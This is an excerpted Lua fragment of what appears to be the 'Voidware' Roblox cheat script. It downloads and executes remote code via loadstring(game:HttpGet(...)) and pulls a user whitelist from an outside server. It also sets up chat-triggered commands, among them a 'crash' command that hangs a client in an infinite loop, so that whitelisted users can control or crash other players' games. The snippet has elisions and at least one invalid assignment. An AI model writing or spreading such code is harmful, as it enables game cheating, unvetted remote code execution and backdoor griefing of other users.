...
pcall(function()
	local suc1, sha = pcall(function()
		return loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/vapevoidware/refs/heads/main/Libraries/sha.lua", true))()
	end)
	local TCS = game:GetService("TextChatService")
	--if shared.CheatEngineMode then
		local whitelist2 = {commands = {}, WhitelistedUsers = {}, hashes = {}}
		local suc2, whitelist2.WhitelistedUsers = pcall(function()
			return game:GetService("HttpService"):JSONDecode(game:HttpGet('https://whitelist.vapevoidware.xyz', true)).WhitelistedUsers
		end)
		whitelist2.WhitelistedUsers = suc2 and whitelist2.WhitelistedUsers or {}
		whitelist2.commands = {
			crash = function()
				task.spawn(setfpscap, 9e9)
				task.spawn(function() repeat until false end)
		...
		function whitelist2:oldchat(plr)

		end
		function whitelist2:hash(str)
			if self.hashes[str] == nil and sha then
				self.hashes[str] = sha.sha512(str..'SelfReport')
			end
			return self.hashes[str] or ''
		end
		function whitelist2:get(plr)
			local plrstr = self:hash(plr.Name..plr.UserId)
			for i,v in self.WhitelistedUsers do
				if v.hash == plrstr then
					return v.level, v.attackable or self.localprio >= v.level, v.tags
				end
			end
		...
		function whitelist2:checkmessage(plr, msg)
			msg = msg or ""
			if string.find(string.lower(tostring(msg)), 'helloimusinginhaler') then
				warningNotification('Voidware WL', tostring(plr).." is using voidware!", 30)
			end
			if self:get(plr) > 0 and self:get(lplr) ~= self:get(plr) or plr == lplr then
				local a = msg:split("")
				if a[1] == ";" then
					local b = msg:split(" ")
		...
		function whitelist2:activate()
			...
			TCS.OnIncomingMessage = function(message) 
				...
				if message.TextSource then
					...
					if player then
						local tagType = getUserRoleTag(player)
						local tagEmoji = tagEmojis[tagType] or ""
						local tagName = tagNames[tagType] or nil
						if tagEmoji and tagName then
							properties.PrefixText = "<b><font color='#ffcc00'>[" .. tagEmoji .. " " .. tagName .. "] </font></b>" .. (message.PrefixText or "")
						end
					end
				end
				return properties
